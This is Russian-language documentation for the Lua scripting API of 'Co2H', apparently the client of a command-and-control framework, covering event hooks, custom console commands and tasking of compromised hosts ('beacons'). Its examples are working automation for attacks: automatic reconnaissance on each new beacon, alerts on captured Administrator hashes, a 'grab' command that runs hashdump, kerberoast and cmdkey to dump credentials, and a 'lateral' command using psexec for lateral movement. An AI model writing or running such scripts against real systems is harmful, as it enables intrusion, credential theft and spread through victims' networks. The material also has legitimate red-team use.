Lua-скриптинг

Co2H содержит встроенный Lua 5.4 движок, позволяющий автоматизировать действия оператора без перекомпиляции клиента. Скрипты реагируют на события (новый бикон, вывод задачи, чат), регистрируют пользовательские команды в консоли и отправляют задачи биконам.

Скрипты работают на стороне клиента, не на сервере и не на биконе. Они автоматизируют то, что оператор делал бы вручную в консоли.

Расположение скриптов

Скрипты хранятся в папке scripts/ рядом с co2h-client.exe:

bin/
  co2h-client.exe
  scripts/
    auto_enum.lua
    grab_creds.lua
    my_workflow.lua

При запуске клиента все файлы *.lua из этой папки загружаются автоматически. Файлы с расширением .lua.example игнорируются — они используются как шаблоны.

Скрипты можно также загружать и перезагружать в любой момент через вкладку Scripts без перезапуска клиента.

Вкладка Scripts

Вкладка Scripts находится между Audit и Logs в главной панели вкладок.

ЭлементНазначение
Список (верхняя половина)Загруженные .lua файлы
Лог (нижняя половина)Вывод вызовов log() из скриптов с временными метками
Load script...Открыть диалог выбора .lua файла для загрузки

API скриптового движка

task(beacon_id, cmd_text)

Отправить команду бикону. Эквивалент ввода команды в консоли оператором.

task("abc123", "shell whoami")
task("abc123", "ps")
task("abc123", "hashdump 2")
beacon_id — строка, идентификатор бикона (первая колонка вкладки Sessions). Команда проходит через тот же диспатчер, что и ручной ввод: все аргументы, синтаксис и поведение одинаковы.

log(text)

Вывести строку в лог вкладки Scripts и в панель Logs.

log("enumeration started on " .. bid)
log("found " .. count .. " processes")

alert(title, text)

Показать всплывающее окно оператору.

alert("High-value target", "Administrator hash found on " .. bid)

beacons()

Вернуть таблицу (массив) всех активных биконов на момент вызова.

for _, b in ipairs(beacons()) do
    log(b.id .. " — " .. b.user .. "@" .. b.host)
end

Поля каждого элемента:

ПолеТипОписание
idstringИдентификатор бикона
hoststringHostname цели
userstringТекущий пользователь на цели
archstring"x64" или "x86"
osstring"windows" или "linux"
pidintegerPID процесса бикона
listenerstringИмя listener'а

on(event_name, callback)

Подписаться на событие. Один скрипт может регистрировать несколько обработчиков на одно событие; все они будут вызваны.

on("beacon_new", function(b)
    -- b.id, b.host, b.user, b.arch, b.os
end)

on("task_output", function(bid, tid, output)
    -- bid    — строка: beacon_id
    -- tid    — число: task_id
    -- output — строка: текст вывода
end)

on("beacon_lost", function(bid)
    -- bid — строка: beacon_id потерявшегося бикона
end)

on("chat", function(from, text)
    -- from — имя оператора
    -- text — текст сообщения
end)

command(name, help, callback)

Зарегистрировать пользовательскую команду в консоли бикона. После загрузки скрипта команда доступна в автодополнении наравне со встроенными.

command("enum", "Run full host enumeration", function(bid, args)
    task(bid, "whoami")
    task(bid, "shell ipconfig /all")
    task(bid, "shell net user")
    task(bid, "ps")
    log("[enum] started on " .. bid)
end)

Параметры callback:

ПараметрОписание
bidИдентификатор бикона с которым взаимодействует текущая консоль
argsВсё что написано после имени команды (строка, может быть пустой)

События

СобытиеКогда вызываетсяАргументы callback
beacon_newКлиент обнаружил новый бикон при очередном опросе сервераb — таблица с полями id, host, user, arch, os
beacon_lostБикон пропал из списка (timeout > 3 минут)bid — строка
task_outputПолучен вывод любой задачи от сервераbid, tid, output
chatПолучено чат-сообщение от любого оператораfrom, text
Важно: скрипты загружаются при старте клиента именно чтобы успеть зарегистрировать обработчики beacon_new до появления биконов. Если загрузить скрипт позже — уже подключённые биконы пропущены, но новые будут обработаны.

Примеры

Автоматическая разведка при появлении бикона

on("beacon_new", function(b)
    log("[auto] new beacon: " .. b.user .. "@" .. b.host .. " (" .. b.arch .. ")")
    task(b.id, "whoami")
    task(b.id, "ps")
    task(b.id, "pwd")
    if b.os == "windows" then
        task(b.id, "shell net user")
        task(b.id, "shell ipconfig /all")
    end
end)

Уведомление при обнаружении хеша администратора

on("task_output", function(bid, tid, output)
    if output:find("Administrator:500:") then
        alert("High-value target", "Admin hash found on beacon " .. bid)
        log("[!] admin hash on " .. bid)
    end
end)

Пользовательская команда для дампа учётных данных

command("grab", "Dump all credential sources", function(bid, args)
    task(bid, "hashdump 2")
    task(bid, "kerberoast")
    task(bid, "shell cmdkey /list")
    log("[grab] credential dump started on " .. bid)
end)

Пользовательская команда с аргументами

-- Использование: lateral 192.168.1.10 administrator
command("lateral", "Quick lateral move: lateral <ip> <user>", function(bid, args)
    local parts = {}
    for w in args:gmatch("%S+") do parts[#parts+1] = w end
    if #parts < 2 then
        log("[lateral] usage: lateral <ip> <user>")
        return
    end
    local ip, user = parts[1], parts[2]
    task(bid, "psexec_cmd " .. ip .. " whoami")
    log("[lateral] moving to " .. ip .. " as " .. user)
end)

Список всех биконов из скрипта

command("listall", "Print all active beacons", function(bid, args)
    local all = beacons()
    log("Active beacons: " .. #all)
    for _, b in ipairs(all) do
        log("  " .. b.id .. " " .. b.user .. "@" .. b.host .. " [" .. b.arch .. "]")
    end
end)

Обработка ошибок

Если в скрипте возникает ошибка Lua (синтаксическая или в runtime), она не обрушивает клиент. Сообщение об ошибке выводится в лог вкладки Scripts:

[03:52:24] [script] error loading my_script.lua: [string]:5: attempt to call a nil value

При ошибке в callback'е события:

[03:52:30] [script] beacon_new error: [string]:12: attempt to concatenate a nil value
Ошибка в одном callback'е не блокирует остальные обработчики того же события — они будут вызваны в том же порядке.

Рекомендации

  • Называйте скрипты описательно: auto_enum.lua, alert_da.lua, grab_creds.lua
  • Один скрипт — одна задача. Не делайте «мега-скрипт» на все случаи жизни
  • Используйте log() для диагностики — вывод виден в реальном времени
  • Перед использованием beacons() в beacon_new учтите, что новый бикон уже добавлен в список к моменту вызова callback
  • Шаблоны-примеры поставляются с расширением .lua.example — скопируйте, переименуйте в .lua и адаптируйте
  • Для перезагрузки скрипта после редактирования — кнопка Reload all во вкладке Scripts
